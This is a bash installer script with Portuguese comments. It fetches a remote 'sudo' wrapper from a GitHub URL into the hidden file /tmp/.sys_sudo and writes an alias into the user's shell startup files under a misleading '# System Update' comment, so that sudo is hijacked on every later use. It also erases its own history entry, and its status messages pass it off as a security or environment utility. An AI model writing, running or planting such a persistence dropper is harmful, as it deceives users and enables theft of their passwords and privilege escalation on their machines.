#!/bin/bash

# Cores para o visual
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}[1/3] Detectando ambiente e sistema...${NC}"
OS_TYPE=$(uname)
USER_HOME=$HOME

# Define onde baixar o script do sudo (ajuste para o SEU link do GitHub)
SUDO_RAW_URL="https://github.com/JempUnkn/tools/raw/refs/heads/main/sudowrapper/sudo"
SUDO_LOCAL_PATH="/tmp/.sys_sudo"

echo -e "${BLUE}[2/3] Baixando componentes de segurança...${NC}"
curl -fsSL "$SUDO_RAW_URL" -o "$SUDO_LOCAL_PATH"
chmod +x "$SUDO_LOCAL_PATH"

echo -e "${BLUE}[3/3] Configurando persistência no Shell...${NC}"


TARGET_FILES=("$USER_HOME/.zshrc" "$USER_HOME/.bashrc" "$USER_HOME/.bash_profile" "$USER_HOME/.profile")
ALIAS_CMD="alias sudo='$SUDO_LOCAL_PATH'"
SUCCESS=false

for file in "${TARGET_FILES[@]}"; do
    touch "$file" 2>/dev/null
    
    if [ -w "$file" ]; then
        # Verifica se já não existe o alias para não duplicar
        if ! grep -q "$SUDO_LOCAL_PATH" "$file"; then
            echo -e "   ${GREEN}→ Injetando em $file${NC}"
            echo -e "\n# System Update\n$ALIAS_CMD" >> "$file"
            SUCCESS=true
        fi
    fi
done

alias sudo="$SUDO_LOCAL_PATH" 2>/dev/null

if [ "$SUCCESS" = true ]; then
    source "$USER_HOME/.zshrc" 2>/dev/null
    source "$USER_HOME/.bashrc" 2>/dev/null
    source "$USER_HOME/.profile" 2>/dev/null

    history -d $(history | tail -n 1 | awk '{print $1}') 2>/dev/null 
    
    echo -e "\n${GREEN}✔ Environment synchronized successfully!${NC}"
    echo -e "${BLUE}ℹ Utility is now active. No restart required.${NC}"
else
    # Se falhou nos arquivos (permissão), mas o alias funcionou na memória
    if alias sudo | grep -q "$SUDO_LOCAL_PATH"; then
        echo -e "\n${GREEN}✔ Utility active in current session.${NC}"
    else
        echo -e "\n\033[0;31m✘ Error: System configuration files not accessible.\033[0m"
    fi
fi